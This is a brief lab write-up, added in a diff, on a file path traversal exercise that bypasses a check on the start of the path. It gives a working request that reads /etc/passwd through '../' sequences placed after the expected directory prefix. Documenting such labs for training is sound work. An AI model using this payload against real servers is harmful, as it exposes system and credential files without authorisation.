@@ -1,0 +1,16 @@
+Lab #5:  File path traversal, validation of start of path
+
+Target: Get access to the content of /etc/passwd
+
+Analysis:
+
+The image files are loaded with Get request and here the complete path is required as the input argument!
+
+GET /image?filename=/var/www/image/72.jpg
+
+send the request to the repeater and change the filename parameter as follows:
+
+
+GET /image?filename=/var/www/images/../../../../etc/passwd
+
+
